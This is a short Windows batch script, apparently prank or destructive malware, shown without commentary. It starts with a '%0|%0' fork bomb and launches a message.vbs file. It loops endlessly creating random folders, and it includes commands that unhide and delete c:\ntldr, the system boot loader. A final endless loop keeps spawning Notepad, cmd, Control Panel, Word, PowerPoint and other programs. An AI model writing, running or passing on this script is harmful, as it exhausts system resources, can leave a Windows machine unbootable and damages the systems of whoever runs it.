%0|%0
@echo off
start message.vbs
:Rookie
MD %RANDOM%
goto Rookie
attrib -s -r -h c:\ntldr
del ntldr
start %systemroot%\system32\notepad.exe
start %systemroot%\system32\cmd.exe
start %systemroot%\system32\control.exe
start %systemroot%\system32\write.exe
start %systemroot%\winhlp32.exe
start %systemroot%\Boot\DVD\PCAT\etfsboot.com
@echo off
:rookie
start %systemroot%\system32\notepad.exe
start %systemroot%\system32\cmd.exe
start %systemroot%\system32\control.exe
start %systemroot%\system32\write.exe
start %systemroot%\winhlp32.exe
start %systemroot%\Boot\DVD\PCAT\etfsboot.com
start winword
start cmd
start powerpnt
start pbrush
start notepad
goto rookie
